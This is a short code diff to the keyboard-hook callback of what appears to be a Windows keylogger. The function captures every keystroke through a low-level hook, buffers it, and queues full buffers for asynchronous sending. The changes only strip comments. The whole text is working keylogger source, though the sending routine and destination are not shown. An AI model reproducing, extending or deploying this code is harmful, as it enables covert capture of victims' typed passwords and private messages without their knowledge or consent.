@@ -4,11 +4,6 @@
 /**
  * Keyboard hook callback function
  * Captures keystrokes and adds to queue for async sending
- * 
- * CRITICAL: This function must be FAST (< 1ms)
- * - NO console output (std::cout)
- * - NO network calls (sendData)
- * - Only capture keystrokes and add to buffer
  */
 LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode < 0 || nCode != HC_ACTION) {
@@ -18,7 +13,6 @@ LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (wParam == WM_KEYDOWN) {
 		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
 		
-		// Update keyboard state
 		GetKeyState(VK_SHIFT);
 		BYTE keyboardState[256];
 		if (!GetKeyboardState(keyboardState)) {
@@ -41,13 +35,12 @@ LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
 			
 			// When buffer is full, add to queue for async sending
 			if (keystrokeBuffer.size() >= MAX_BUFFER) {
-				// Thread-safe queue push
 				{
 					std::lock_guard<std::mutex> lock(queueMutex);
 					sendQueue.push(keystrokeBuffer);
 				}
 				
-				keystrokeBuffer.clear();  // Clear buffer immediately
+				keystrokeBuffer.clear();
 			}
 		}
 	}
